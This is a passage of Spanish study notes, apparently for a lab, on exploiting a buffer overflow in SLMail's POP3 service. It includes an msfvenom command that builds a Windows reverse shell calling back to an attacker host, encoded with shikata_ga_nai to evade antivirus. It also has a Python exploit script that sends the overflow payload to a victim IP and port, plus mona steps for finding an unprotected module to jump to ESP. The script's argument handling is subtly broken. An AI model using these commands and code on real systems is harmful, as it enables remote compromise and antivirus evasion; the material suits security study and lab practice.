---
Tema: "[[Buffer Overflow]]"
---
Una vez que tenemos el payload con los badchars filtrados la idea es meter  un payload malicioso o shellcode a la pila ESP

para insertar un shellcode hay que tener en cuenta usar un [[enconder]] por ejemplo ***shikata ga nai***

>[!important]
>Un**Shikata Ga Nai encoder** es una herramienta de codificación utilizada principalmente en el framework de seguridad Metasploit, cuyo nombre en japonés significa "no hay remedio" o "no se puede evitar". Su función es **ofuscar (ocultar)** el código malicioso (payloads) para que no sea detectado por los antivirus tradicionales, usando técnicas como XOR polimórfico y aleatorización de instrucciones, creando una versión única del código en cada uso.

lo haremos con una de las herrmientas de metasploit el cual es [[msfvenom]]

para buscar payloads
```sh
msfvenom -l payloads
```

para buscar encoders 
```sh
msfvenom -l encoders
```


tenemos entoces los badchars que son
`\x00\x0a\x0d`

por lo queq con msfvenom creariamos el shellcode de la siguiente manera

```sh
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=ip_atacante LPORT=443 -f py -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread
``` 

- -p especificamos el payload
- --platform especificamos el SO
- -a es para la arquitectura
- LHOST es la ip a donde redirige la consola
- LPORT es el puerto de la maquina atacante
- -f es el tipo de salida en este caso para un script en python
- -e es el encoder en este caso ocupa shikata ga nai como encoder para tema de evasion de antivirus y demas
- -b son los badchars que debe excluir en el shellcod

- EXITFUNC es para que el exploit dependa de un proceso hijo y no se rompa el servicio una vez terminado



por lo que ese shellcode hay que  copiarlo al codigo

```python
import socket
import sys
IP_ADDRESS = "192.168.1.5"  # < --  IP de la victima
PORT =  110               # < --  puerto del servicio
offset = 2606
before_eip = b"A" * 2606
eip = b"B" * 4
shellcode = (b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23") # <- ESP - stack pointer

payload = before_eip + eip + shellcode

def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # nos conectamos a la victima
    s.connect((IP_ADDRESS, PORT))
    banner = s.recv(1024)
    print(f"[+] Banner: {banner}")
    s.send(b"USER test\r\n")
    response = s.recv(1024)
    print(f"[+] Response: {response}")
    s.send(b"PASS " + payload + b"\r\n")
    s.close()
if __name__ == '__main__':
    if len(sys.argv) == 3:
        IP_ADDRESS = sys.argv[1]
        PORT = int(sys.argv[2])
        print(f"\n[!] Uso: python {sys.argv[0]} <IP>")
        exit(1)
        
```


ahora el tema de buscar el OpCode para saltar al ESP

en [[mona (python)]] 

`!mona modules`

nos devuelve los modulos como estos. los cuales cada modulo es un `.exe` o un `.dll`

![[Pasted image 20251221181930.png]]

si miramos hay un .dll que es de slmail de nuestro laboratorio. que tiene las columnas rebase safeSEH, ASLR, NXcompat en falso lo cual no cuenta con esas protecciones (l auiltima columna dice si es OS DLL el cual este tiene en true porque es un dll)

![[Pasted image 20251221182032.png]]

